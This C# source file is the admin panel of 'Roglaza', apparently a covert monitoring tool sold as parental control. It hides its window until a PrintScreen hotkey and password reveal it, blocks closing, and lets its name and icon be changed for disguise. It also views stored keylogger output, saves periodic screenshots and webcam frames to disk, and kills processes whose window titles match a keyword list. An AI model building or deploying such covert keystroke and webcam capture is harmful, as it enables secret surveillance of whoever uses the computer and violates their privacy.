using Roglaza.Classes;
using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using System.Xml.Linq;
     
using System.Threading.Tasks; 
using AForge.Video;
using AForge.Video.DirectShow;
using AForge.Video.VFW;
using AForge.Video.FFMPEG; 

namespace Roglaza.Forms
{
    public partial class FrmAdminPanel : Form
    {

        VideoCaptureDevice videosource; int Camera_ticks = 0;

        public FrmAdminPanel(bool allowAccess=false)
        {
            InitializeComponent();
            SetVisibility(allowAccess);
            ghk = new KeyHandler(Keys.PrintScreen, this);
           
            ghk.Register();
        }
        private void ShowAccesspanel()
        {
            Pressed_busy = true;
            if (!(this.Visible && this.tabControl1.Visible))
            {
                var f = new FrmGate();
                f.ShowInTaskbar = true;
                f.StartPosition = FormStartPosition.CenterParent;
                if (f.ShowDialog() == DialogResult.OK)
                    SetVisibility(true);
            }
            else
                SetVisibility(false);
            Pressed_busy = false;

        }
        private void SetVisibility(bool p)
        {
            if (p)
                timerSession.Start();
            if (AppInfo.TestMode)
            {

                if (p)
                {
                    this.Opacity = .9;
                    this.ShowInTaskbar = true;
                }
                else
                {
                    this.Opacity = .5;
                   // this.ShowInTaskbar = false;

                }
            }
            else
            {
                this.Visible = p;
                this.WindowState = p ? FormWindowState.Normal : FormWindowState.Minimized;
                this.StartPosition = FormStartPosition.CenterScreen;
                this.ShowInTaskbar = p;
                this.Focus();
            }
            tabControl1.Visible = p;
            this.WindowState = p ? FormWindowState.Normal : FormWindowState.Minimized;


        }

        public FrmAdminPanel(string userinput)
        {
           InitializeComponent();
        
        }

        private void FrmAdminPanel_Load(object sender, EventArgs e)
        {
            Camera_Load(); 
            comboBox_capture_Type.SelectedIndex = 0;

            labelBannerHidden.Text = MessageStrings.ImHidden;
            label_Banner.Text = AppInfo.AppBanner;
            label_app_Name.Text = AppInfo.AppName;
            this.numericUpDown_screenShotInterval.Value = Program.ProgramSettings.ScreenShotInterValMinutes<numericUpDown_screenShotInterval.Maximum?Program.ProgramSettings.ScreenShotInterValMinutes:60;
            if (AppInfo.TestMode)
                this.timerWatcher.Interval = 5000;

            this.timerWatcher.Start();
            if (AppInfo.TestMode)
                this.Opacity = .1;

            this.checkBoxBrowserHistory.Checked = Program.ProgramSettings.AllowBrowserHistory;
            this.checkBoxScreenShots.Checked = Program.ProgramSettings.AllowScreenShots;
            this.checkBoxCamShots.Checked = Program.ProgramSettings.AllowCamShots;
            this.checkBoxKeyLogger.Checked = Program.ProgramSettings.AllowKeyLogger;
            this.checkBox_BlockPorno.Checked = Program.ProgramSettings.AllowPornoBlocker;
            this.checkBox_parent_msg.Checked = Program.ProgramSettings.showDadMessage;


            this.textBox_Icon_path.Text = Program.ProgramSettings.RoglazaIconPath;
            this.textBox_parent_msg.Text = Program.ProgramSettings.DadMessage;
            try
            {
                this.Text =this.textBoxAppName.Text= Program.ProgramSettings.RoglazaName;
                if (RoglazaHelper.IsExistedFile(Program.ProgramSettings.RoglazaIconPath))
                    this.Icon = new Icon(Program.ProgramSettings.RoglazaIconPath);
            }
            catch { }
            textBox_logsPath.Text = Program.ProgramSettings.LogsPath;
            FormLoaded = true;
            LoadMatches();
            button_save.Visible = false;

            LoadStoredKeystrokes();
        }

     

        private void LoadStoredKeystrokes()
        {
            label_keystrokes_path.Text = Program.ProgramSettings.KeyLoggerStorePath;
            richTextBox_keystrokes_viewer.Text = RoglazaHelper.ReadTextFile(label_keystrokes_path.Text);
        }

        private void LoadMatches()
        {
            foreach (string s in Program.ProgramSettings.matches_lists)
                if (listBox_matches.Items.Contains(s) == false)
                    listBox_matches.Items.Add(s);
            addnew_match("");
        }
        private bool Pressed_busy = false;
        private KeyHandler ghk;
        private int pressed_button_times = 0;
        private void HandleHotkey()
        {
            if (Pressed_busy == false)
                ShowAccesspanel(); 
        }

        protected override void WndProc(ref Message m)
        {
            if (m.Msg == Constants.WM_HOTKEY_MSG_ID)
                HandleHotkey();
            base.WndProc(ref m);
        }

        private void button1_Click(object sender, EventArgs e)
        {
        }

        private void FrmAdminPanel_Resize(object sender, EventArgs e)
        {

            if (this.WindowState== FormWindowState.Minimized)
                tabControl1.Visible = false;
           
        }

        private void FrmAdminPanel_VisibleChanged(object sender, EventArgs e)
        {
            Pressed_busy = false;

        }

        private void FrmAdminPanel_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (Program.WillExit == false)
            {
                e.Cancel = true;
                this.Activate();
                this.Pressed_busy = false;
            }
        }

        private void Camera_Load()
        {
            FilterInfoCollection videosorces = new FilterInfoCollection(FilterCategory.VideoInputDevice);

            if (videosorces != null)
            {
                videosource = new VideoCaptureDevice(videosorces[0].MonikerString);

                try
                {
                    if (videosource.VideoCapabilities.Length > 0)
                    {
                        string highestresolution = "0;0";

                        for (int i = 0; i < videosource.VideoCapabilities.Length; i++)
                        {
                            if (videosource.VideoCapabilities[i].FrameSize.Width > Convert.ToInt32(highestresolution.Split(';')[0]))
                            {
                                highestresolution = videosource.VideoCapabilities[i].FrameSize.Width.ToString() + ";" + i.ToString();
                            }
                        }

                        videosource.VideoResolution = videosource.VideoCapabilities[Convert.ToInt32(highestresolution.Split(';')[1])];
                    }
                }
                catch { }

                videosource.NewFrame += new AForge.Video.NewFrameEventHandler(videoSource_NewFrame);
                videosource.Start();
            }

        }

        void videoSource_NewFrame(object sender, AForge.Video.NewFrameEventArgs eventArgs)
        {
            pictureBox_camera.BackgroundImage = (Bitmap)eventArgs.Frame.Clone();

        }
        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {
            if (videosource != null && videosource.IsRunning)
            {
                videosource.SignalToStop();
                videosource = null;
            }
        }
        private void timerWatcher_Tick(object sender, EventArgs e)
        {

            Capture_count++;
            // Constructing__path.
            string _date = RoglazaHelper.RemoveInvalidPathChars(DateTime.Now.ToShortDateString());
            int current_hour = DateTime.Now.Hour;
            string current_hour_str = "12 PM";
            if (current_hour == 0)
                current_hour_str = "12 AM";
            else if (current_hour < 12)
                current_hour_str = current_hour + " AM";
            else if (current_hour > 12)
                current_hour_str = (current_hour - 12) + " PM";


            string Screens_Directory = Program.ProgramSettings.LogsPath + "\\Screens\\" + _date + "\\" + current_hour_str;
            string Cams_Directory = Program.ProgramSettings.LogsPath + "\\Cams\\" + _date + "\\" + current_hour_str;

            Screens_Directory = RoglazaHelper.createDirectoryIfNotFound(Screens_Directory);
            Cams_Directory = RoglazaHelper.createDirectoryIfNotFound(Cams_Directory);


            string TimeStamp_ = "\\" + RoglazaHelper.RemoveInvalidPathChars(DateTime.Now.ToShortTimeString().ToString());

            string Screen_Path_ = Screens_Directory + TimeStamp_ + "  " + this.Capture_count + ".png";
            string Cams_Path_ = Cams_Directory + TimeStamp_ + "  " + this.Capture_count + ".png";


            if (Program.ProgramSettings.AllowScreenShots)
            {
                var bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                                   Screen.PrimaryScreen.Bounds.Height,
                                   PixelFormat.Format32bppArgb);

                // Create a graphics object from the bitmap.
                var gfxScreenshot = Graphics.FromImage(bmpScreenshot);

                // Take the screenshot from the upper left corner to the right bottom corner.
                gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X,
                                            Screen.PrimaryScreen.Bounds.Y,
                                            0,
                                            0,
                                            Screen.PrimaryScreen.Bounds.Size,
                                            CopyPixelOperation.SourceCopy);



                bmpScreenshot.Save(Screen_Path_, ImageFormat.Jpeg);
                

            }

            if(pictureBox_camera.BackgroundImage!=null && Program.ProgramSettings.AllowCamShots)
                pictureBox_camera.BackgroundImage.Save(Cams_Path_, ImageFormat.Jpeg);
               
                  
        }

        private void numericUpDown_screenShotInterval_ValueChanged(object sender, EventArgs e)
        {
            if (AppInfo.TestMode)
                this.timerWatcher.Interval = 5000;
            else
                this.timerWatcher.Interval = ((int)numericUpDown_screenShotInterval.Value) * 60000;
            Program.ProgramSettings.SETScreenShotInterValMinutes((int)numericUpDown_screenShotInterval.Value);
        }

        private void button_Exit_Click(object sender, EventArgs e)
        {

        }

        private void linkLabelOpenLogsFolder_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            RoglazaHelper.StartProcess(Program.ProgramSettings.LogsPath);
        }

        private void panel1_VisibleChanged(object sender, EventArgs e)
        {
            this.labelBannerHidden.Visible = !tabControl1.Visible;
        }





        public bool FormLoaded=false;

        private void checkBoxKeyLogger_CheckedChanged(object sender, EventArgs e)
        {

            if (FormLoaded)
                Program.ProgramSettings.AllowKeyLogger = panel_Logs_control.Enabled=checkBoxKeyLogger.Checked;
            Program.ProgramSettings.SaveSettings();

        }

        private void checkBoxBrowserHistory_CheckedChanged(object sender, EventArgs e)
        {

            if (FormLoaded)
                Program.ProgramSettings.AllowBrowserHistory = checkBoxBrowserHistory.Checked;
            Program.ProgramSettings.SaveSettings();

        }

        private void checkBoxScreenShots_CheckedChanged(object sender, EventArgs e)
        {

            if (FormLoaded)
                Program.ProgramSettings.AllowScreenShots = checkBoxScreenShots.Checked;
            Program.ProgramSettings.SaveSettings();

        }

        private void checkBoxCamShots_CheckedChanged(object sender, EventArgs e)
        {
            if (FormLoaded)
                Program.ProgramSettings.AllowCamShots = checkBoxCamShots.Checked;
            Program.ProgramSettings.SaveSettings();

        }

        private void buttonBrwseicon_Click(object sender, EventArgs e)
        {
            OpenFileDialog o = new OpenFileDialog();
            o.Filter = "icon File (*.ico)|.ico";
            if (o.ShowDialog() == DialogResult.OK && o.FileName.EndsWith(".ico"))
            {
                Program.ProgramSettings.RoglazaIconPath = o.FileName;
                Program.ProgramSettings.SaveSettings();
            }
        }

        private void textBoxAppName_TextChanged(object sender, EventArgs e)
        {
            if (FormLoaded)
            {
                Program.ProgramSettings.RoglazaName = this.Text = this.textBoxAppName.Text;
                Program.ProgramSettings.SaveSettings();

            }
        }

        private void textBox_Icon_path_TextChanged(object sender, EventArgs e)
        {
            try
            {
                this.panel_icon_Preview.BackgroundImage = Image.FromFile(textBox_Icon_path.Text);
            }
            catch { }
        }

        private void timerSession_Tick(object sender, EventArgs e)
        {
            timerSession.Stop();
            SetVisibility(false);
        }

        private void labelBannerHidden_VisibleChanged(object sender, EventArgs e)
        {
            pictureBox_Spy.Visible = labelBannerHidden.Visible;
            pictureBox_Spy.Location = new Point(184, 34);
            pictureBox_Spy.Size = new Size(360, 258);
        }

        private void buttonKill_Click(object sender, EventArgs e)
        {
             
                var f = new FrmGate();
                f.ShowInTaskbar = true;
                f.StartPosition = FormStartPosition.CenterParent;
                if (f.ShowDialog() != DialogResult.OK)
                    return;

                Program.WillExit = true;

            DialogResult d = MessageBox.Show(MessageStrings.DoYouWantToStopTheApplication, MessageStrings.Warning, MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
            if (d == DialogResult.OK || d==DialogResult.Yes)
            {
                if (RoglazaInstaller.SetKillFile(true))
                {
                    MessageBox.Show(MessageStrings.UnistallationMessage, MessageStrings.UnistallationMessage_Caption);
                    buttonKill.Visible = false;
                }
                else MessageBox.Show(MessageStrings.KillingError);
            }
        }

        private void buttonCancelUnistallation_Click(object sender, EventArgs e)
        {
            if (RoglazaInstaller.SetKillFile(false))
            {
                buttonKill.Visible = true;
                Program.WillExit = false;
                MessageBox.Show(MessageStrings.ProgramWillContinueWorking, MessageStrings.Thanks);
            }
        }

        private void buttonKill_VisibleChanged(object sender, EventArgs e)
        {
            buttonCancelUnistallation.Visible = !buttonKill.Visible;
        }

        private void linkLabel_app_data_dir_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            RoglazaHelper.StartProcess(RoglazaInstaller.GetRoglazaAPPDataPath());
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {
            if (FormLoaded)
            {
                Program.ProgramSettings.LogsPath = textBox_logsPath.Text;
                Program.ProgramSettings.SaveSettings();
            }
        }

        private void button_Browse_logs_path_Click(object sender, EventArgs e)
        {

            FolderBrowserDialog f = new FolderBrowserDialog();
            if (f.ShowDialog() == DialogResult.OK)
                textBox_logsPath.Text = f.SelectedPath;
          
        }

        public int Capture_count = 1;

        private void button1_Click_1(object sender, EventArgs e)
        {

        }

        private void timer_porn_blocker_Tick(object sender, EventArgs e)
        {
            // Credits to 
            //https://github.com/Kalpeshk9967016292/Antiporn
            try
            {
                var proxes = Process.GetProcesses();
                int myid = Process.GetCurrentProcess().Id;
                foreach (Process p in proxes)
                {
                    string cp = p.MainWindowTitle.ToString().ToLower();
                    if (cp.Length < 1)
                        continue;
                    if (cp.Contains("oglaza") && myid != p.Id && cp.Contains("microsoft visual studio") == false && cp.Contains(".rog") == false)
                        continue;
                    foreach (string value in  MessageStrings.ContentBlockerMatches)
                    {

                        if (cp.Contains(value.ToString()))   {
                            timer_porn_blocker.Stop();
                            timer_porn_blocker.Enabled = false;
                            p.Kill();
                            if (Program.ProgramSettings.showDadMessage)
                                MessageBox.Show("Sorry I am afraid i can't let you do that " + value.ToString() + " ;","Your dad is watching you");
                           // Log();
                            timer_porn_blocker.Enabled = true;
                            timer_porn_blocker.Start();

                        }
                    }
                }
            }
            catch { }
        }

        private void checkBox_BlockPorno_CheckedChanged(object sender, EventArgs e)
        {
            if (FormLoaded)
                Program.ProgramSettings.AllowPornoBlocker =panel_content_Container.Enabled= checkBox_BlockPorno.Checked;
            Program.ProgramSettings.SaveSettings();

            if (Program.ProgramSettings.AllowPornoBlocker)
                timer_porn_blocker.Start();

        }

        private void panelContainer_VisibleChanged(object sender, EventArgs e)
        {

        }

        private void tabControl1_VisibleChanged(object sender, EventArgs e)
        {
            labelBannerHidden.Visible = !tabControl1.Visible;
            panelContainer.Visible = tabControl1.Visible;
        }

        private void button_clear_Click(object sender, EventArgs e)
        {
            listBox_matches.Items.Clear();
            addnew_match("");
        }

        private void listBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            button_Remove_match.Enabled = listBox_matches.SelectedIndex >= 0;
        }

        private void button_add_new_match_Click(object sender, EventArgs e)
        {
            string nm = textBox_New_match.Text.Trim().ToLower();
            if (listBox_matches.Items.Contains(nm))
                return;
            addnew_match(nm);
        }

        private void addnew_match(string nm)
        {
            if (nm != "" && listBox_matches.Items.Contains(nm)==false)
                listBox_matches.Items.Add(nm);
            label_matches_count.Text = listBox_matches.Items.Count.ToString() + " items";
            button_save.Visible = true;

        }

        private void button_Remove_match_Click(object sender, EventArgs e)
        {
            int i = listBox_matches.SelectedIndex;
            if (listBox_matches.SelectedIndex >= 0)
                listBox_matches.Items.RemoveAt(i);
            if (listBox_matches.Items.Count > i)
                listBox_matches.SelectedIndex = i;
            addnew_match("");
        }

        private void button1_Click_2(object sender, EventArgs e)
        {
            Program.ProgramSettings.saveMatches(listBox_matches.Items);
            
            button_save.Visible = false;
            Program.ProgramSettings.SaveSettings();
        }

        private void textBox_New_match_TextChanged(object sender, EventArgs e)
        {
            button_add_new_match.Enabled = textBox_New_match.Text.Trim().Length > 2;
        }

        private void timer_global_Tick(object sender, EventArgs e)
        {
            LoadStoredKeystrokes();
        }

        private void button1_Clear_keystrokes__Click(object sender, EventArgs e)
        {
            RoglazaHelper.FileWriteText(Program.ProgramSettings.KeyLoggerStorePath, "");
            richTextBox_keystrokes_viewer.Text = RoglazaHelper.ReadTextFile(Program.ProgramSettings.KeyLoggerStorePath);
        }

        private void button_export_Click(object sender, EventArgs e)
        {
            SaveFileDialog s = new SaveFileDialog();
            s.FileName = "Logs.txt";
            if (s.ShowDialog() == DialogResult.OK)
            {
                if (RoglazaHelper.FileWriteText(s.FileName, richTextBox_keystrokes_viewer.Text))
                    MessageBox.Show("success");
            }
        }

        private void comboBox_capture_device_SelectedIndexChanged(object sender, EventArgs e)
        {
            OrganizeCaptureView();
        }

        private void OrganizeCaptureView()
        {
            pictureBox_Capture_Viewer.Image = null;
            comboBox_capture_day.Items.Clear();
            comboBox_capture_day.DisplayMember = "Text";
            comboBox_capture_day.ValueMember = "Value";


            comboBox_Capture_hour.Items.Clear();
            comboBox_Capture_hour.DisplayMember = "Text";
            comboBox_Capture_hour.ValueMember = "Value";


            comboBox_file.Items.Clear();
            comboBox_file.DisplayMember = "Text";
            comboBox_file.ValueMember = "Value";

            string logsPath = Program.ProgramSettings.LogsPath+"\\"+(comboBox_capture_Type.SelectedIndex==0?"Screens":"Cams");
            string[] dirs = RoglazaHelper.GetDirectories(logsPath);
            if (dirs == null)
                return;
            if (dirs.Length < 1)
                return;
            foreach (string s in dirs)
            {
                var ir = new CMBX_Item(RoglazaHelper.ReturnLastSplit(s, '\\'), s);
                comboBox_capture_day.Items.Add(ir);
            }
            if (comboBox_capture_day.Items.Count > 0)
                comboBox_capture_day.SelectedIndex = 0;
            
        }

        private void comboBox_capture_day_SelectedIndexChanged(object sender, EventArgs e)
        {
            

            comboBox_Capture_hour.Items.Clear();
            comboBox_Capture_hour.DisplayMember = "Text";
            comboBox_Capture_hour.ValueMember = "Value";


            comboBox_file.Items.Clear();
            comboBox_file.DisplayMember = "Text";
            comboBox_file.ValueMember = "Value";

            if (comboBox_capture_day.SelectedIndex < 0)
                return;
            string logsPath =  ((CMBX_Item)comboBox_capture_day.SelectedItem).Value;
            string[] dirs = RoglazaHelper.GetDirectories(logsPath);
            if (dirs == null)
                return;
            if (dirs.Length < 1)
                return;
            foreach (string s in dirs)
            {
                var ir = new CMBX_Item(RoglazaHelper.ReturnLastSplit(s, '\\'), s);
                comboBox_Capture_hour.Items.Add(ir);
            }
            if (comboBox_Capture_hour.Items.Count > 0)
                comboBox_Capture_hour.SelectedIndex = 0;


        }

        private void comboBox_Capture_hour_SelectedIndexChanged(object sender, EventArgs e)
        {
            
            comboBox_file.Items.Clear();
            comboBox_file.DisplayMember = "Text";
            comboBox_file.ValueMember = "Value";
            if (comboBox_capture_day.SelectedIndex < 0)
                return;
            string logsPath = ((CMBX_Item)comboBox_Capture_hour.SelectedItem).Value;
            string[] dirs = RoglazaHelper.GetFiles(logsPath);
            if (dirs == null)
                return;
            if (dirs.Length < 1)
                return;
            foreach (string s in dirs)
            {
                var ir = new CMBX_Item(RoglazaHelper.ReturnLastSplit(s, '\\'), s);
                comboBox_file.Items.Add(ir);
            }
            if (comboBox_file.Items.Count > 0)
                comboBox_file.SelectedIndex = 0;
        }

        private void comboBox_file_SelectedIndexChanged(object sender, EventArgs e)
        {
            try
            {
                var r =(CMBX_Item)comboBox_file.SelectedItem;
                pictureBox_Capture_Viewer.Image=Image.FromFile(r.Value);
                pictureBox_Capture_Viewer.Tag = r.Value;
                label_images_counter.Text = (comboBox_file.SelectedIndex + 1).ToString();
              
                button_NextImage.Visible = comboBox_file.SelectedIndex < comboBox_file.Items.Count - 1;
                button_Prev_image.Visible = comboBox_file.SelectedIndex > 0;
            }
            catch
            {
            }
        }

        private void button_NextImage_Click(object sender, EventArgs e)
        {
            int i = comboBox_file.SelectedIndex + 1;
            if (comboBox_file.Items.Count <= i)
                i = 0;
            comboBox_file.SelectedIndex = i;
        }

        private void button_Prev_image_Click(object sender, EventArgs e)
        {
            int i = comboBox_file.SelectedIndex - 1;
            if (i < 0)
               i= comboBox_file.Items.Count-1;
            comboBox_file.SelectedIndex = i;
        }

        private void pictureBox_Capture_Viewer_Click(object sender, EventArgs e)
        {
            if (pictureBox_Capture_Viewer.Tag == null)
                return;
            if (RoglazaHelper.IsExistedFile(pictureBox_Capture_Viewer.Tag.ToString()) == false)
                return;
            ImagePreviewer p = new ImagePreviewer();
            p.Icon = this.Icon;
            p.Imagepath = pictureBox_Capture_Viewer.Tag.ToString();
            p.ShowDialog();
        }

        private void button_setPassword_Click(object sender, EventArgs e)
        {
            if (MessageBox.Show(MessageStrings.AreYouSureToChangePass, "Warning", MessageBoxButtons.YesNo, MessageBoxIcon.Information) == DialogResult.Yes)
            {
                Program.ProgramSettings.SetNewPassword(textBox_new_password.Text);
                MessageBox.Show("Success");
            }
        }

       

        private void panel_content_Container_Paint(object sender, PaintEventArgs e)
        {

        }

        private void linkLabel1_LoadDefaults_Clicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            string[] lst = MessageStrings.ContentBlockerMatches__static.Split(',');
            foreach (string s in lst)
                addnew_match(s.Trim());
           
        }

        private void textBox_new_password_TextChanged(object sender, EventArgs e)
        {
            button_setPassword.Enabled = textBox_new_password.Text.Trim().Length > 2;
        }

        private void checkBox_parent_msg_CheckedChanged(object sender, EventArgs e)
        {
            textBox_parent_msg.Enabled = checkBox_parent_msg.Checked;
            if (FormLoaded)
            {
               
                Program.ProgramSettings.showDadMessage = checkBox_parent_msg.Checked;
                button_save.Visible = true;
            }

        }

        private void textBox_parent_msg_TextChanged(object sender, EventArgs e)
        {
            if(FormLoaded)
                Program.ProgramSettings.DadMessage = textBox_parent_msg.Text;
            button_save.Visible = true;


        }
    }
    //Refernce
    //http://stackoverflow.com/questions/18291448/how-do-i-detect-keypress-while-not-focused
    public class KeyHandler
    {
        [DllImport("user32.dll")]
        private static extern bool RegisterHotKey(IntPtr hWnd, int id, int fsModifiers, int vk);

        [DllImport("user32.dll")]
        private static extern bool UnregisterHotKey(IntPtr hWnd, int id);

        private int key;
        private IntPtr hWnd;
        private int id;

        public KeyHandler(Keys key, Form form)
        {
            this.key = (int)key;
            this.hWnd = form.Handle;
            id = this.GetHashCode();
        }

        public override int GetHashCode()
        {
            return key ^ hWnd.ToInt32();
        }

        public bool Register()
        {
            return RegisterHotKey(hWnd, id, 0, key);
        }

        public bool Unregiser()
        {
            return UnregisterHotKey(hWnd, id);
        }
    }
    public static class Constants
    {
        //windows message id for hotkey
        public const int WM_HOTKEY_MSG_ID = 0x0312;
    }
}
